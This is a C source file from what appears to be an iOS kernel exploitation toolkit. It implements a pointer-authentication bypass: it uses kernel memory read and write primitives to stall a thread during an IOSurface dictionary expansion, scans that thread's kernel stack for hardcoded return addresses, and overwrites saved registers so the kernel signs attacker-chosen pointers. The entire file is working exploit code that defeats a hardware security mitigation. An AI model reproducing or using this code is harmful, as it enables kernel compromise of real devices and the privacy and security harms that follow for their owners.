//
//  util_pacda.c
//  xe
//
//  Created by admin on 12/3/21.
//

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "util/pacda.h"
#include "util/ptrauth.h"
#include "util/lck_rw.h"
#include "util/dispatch.h"
#include "platform_params.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/assert.h"
#include "util/log.h"

//#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00078f3cbc
//#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9ea8

#define KALLOC_TO_KERNEL_MAP_SWITCH_LEN 64512
#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00079114a4
#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9e54
#define STACK_SCAN_SIZE 8192


IOSurfaceRef xe_util_pacda_iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void xe_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "xe_key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
        IOSurfaceSetValue(surface, key, value);
        CFRelease(key);
        CFRelease(value);
    }
}

void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
    IOSurfaceDecrementUseCount(surface);
}

int xe_util_pacda_find_thread_with_state(uintptr_t proc, int state, uintptr_t* ptr_out) {
    uintptr_t task = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(proc, TYPE_PROC_MEM_TASK_OFFSET)));
    
    uintptr_t thread = xe_kmem_read_uint64(KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET));
    while (thread != 0 && thread != KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET)) {
        int thread_state = xe_kmem_read_int32(KMEM_OFFSET(thread, TYPE_THREAD_MEM_STATE_OFFSET));
        if (thread_state == state) {
            *ptr_out = thread;
            return 0;
        }
        thread = xe_kmem_read_uint64(KMEM_OFFSET(thread, TYPE_THREAD_MEM_TASK_THREADS_OFFSET));
    }
    
    return ENOENT;
}

uintptr_t xe_util_pacda_find_ptr(uintptr_t base, char* data, size_t data_size, uintptr_t ptr, uintptr_t mask) {
    uintptr_t* values = (uintptr_t*)data;
    size_t count = data_size / sizeof(uintptr_t);
    
    for (size_t i=0; i<count; i++) {
        if ((values[i] | mask) == ptr) {
            return base + i * sizeof(uintptr_t);
        }
    }
    
    return 0;
}

int xe_util_pacda_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
    uintptr_t target_thread = 0;
    int error = 0;
    int tries = 10;
    do {
        error = xe_util_pacda_find_thread_with_state(proc, 0x1 | 0x8, &target_thread);
        tries--;
        sleep(1);
    } while (error != 0 && tries > 0);
    *ptr_out = target_thread;
    return error;
}


uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
    uintptr_t machine = KMEM_OFFSET(thread, TYPE_THREAD_MEM_MACHINE_OFFSET);
    uintptr_t kstackptr = xe_kmem_read_uint64(KMEM_OFFSET(machine, TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET));
    return kstackptr;
}


int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
    xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
    
    uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kalloc_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
    uintptr_t kalloc_map_lck = KMEM_OFFSET(kalloc_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
    
    char* stack = NULL;
    xe_util_lck_rw_t util_lck_rw = NULL;
    IOSurfaceRef surface = xe_util_pacda_iosurface_create();
    if (!surface) {
        return ENOMEM;
    }
    
    xe_util_pacda_io_surface_add_values(surface, 0, KALLOC_TO_KERNEL_MAP_SWITCH_LEN - 1);
    util_lck_rw = xe_util_lck_rw_lock_exclusive(proc, kalloc_map_lck);
    
    dispatch_semaphore_t sem_add_value_complete = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        xe_util_pacda_io_surface_add_values(surface, KALLOC_TO_KERNEL_MAP_SWITCH_LEN, 1);
        dispatch_semaphore_signal(sem_add_value_complete);
    });
    
    uintptr_t target_thread = 0;
    int error = xe_util_pacda_find_target_thread(proc, &target_thread);
    if (error) {
        goto exit;
    }
    
    uintptr_t kstackptr = xe_util_pacda_get_kstack_ptr(target_thread);
    if (kstackptr == 0) {
        error = EAGAIN;
        goto exit;
    }
    
    stack = malloc(STACK_SCAN_SIZE);
    kstackptr -= STACK_SCAN_SIZE;
    xe_kmem_read(stack, kstackptr, STACK_SCAN_SIZE);
    
    uintptr_t lr_kfree = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_ENSURE_CAPACITY_KFREE), XE_PTRAUTH_MASK);
    if (lr_kfree == 0) {
        error = EAGAIN;
        goto exit;
    }
        
    uintptr_t lr_lck_rw_excl_gen = xe_util_pacda_find_ptr(kstackptr, stack, STACK_SCAN_SIZE, xe_slider_kernel_slide(LR_LCK_RW_LOCK_EXCLUSIVE_GEN), XE_PTRAUTH_MASK);
    if (lr_lck_rw_excl_gen == 0) {
        error = EAGAIN;
        goto exit;
    }
    
    uintptr_t x19 = lr_kfree - 0x10; // dict
    uintptr_t x20 = x19 - 0x8; // pacda ptr
    uintptr_t x21 = x20 - 0x8; // dict capacity
    uintptr_t x23 = lr_lck_rw_excl_gen - 0x30; // pacda ctx

    uintptr_t dict = xe_kmem_read_uint64(x19);
    xe_kmem_write_uint64(x20, ptr);
    xe_kmem_write_uint64(x23, ctx);
    xe_kmem_write_uint64(x21, 0);
    
    xe_util_lck_rw_lock_done(&util_lck_rw);
    dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
    
    uintptr_t signed_ptr = xe_kmem_read_uint64(KMEM_OFFSET(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET));
    
    xe_kmem_write_uint64(KMEM_OFFSET(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET), 0);
    xe_kmem_write_uint32(KMEM_OFFSET(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET), 0);
    
    *out = signed_ptr;
    
    xe_log_debug("signed ptr %p, result: %p", (void*)ptr, (void*)signed_ptr);
exit:
    if (util_lck_rw) {
        xe_util_lck_rw_lock_done(&util_lck_rw);
    }
    if (surface) {
        xe_util_pacda_io_surface_destroy(surface);
    }
    if (stack) {
        free(stack);
    }
    
    return error;
}
